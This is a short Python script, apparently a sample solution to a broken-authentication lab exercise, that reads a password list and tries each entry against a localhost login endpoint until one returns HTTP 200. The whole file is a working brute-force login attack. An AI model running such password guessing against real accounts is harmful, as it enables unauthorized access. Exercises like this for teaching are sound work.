#This is a sample solution for broken authentication.

import requests
file = open("possible_pws.txt", "r")
output = file.read()
possible_pws = output.split()

"""Attempt a login with all of the passwords.
   Print the password out if we encounter
   a 200 status code."""

for i in range(len(possible_pws)):
    password = possible_pws[i]
    r = requests.get('http://localhost:8000/user/login', auth=('user', password))
    if (r.status_code == 200):
        print(password)
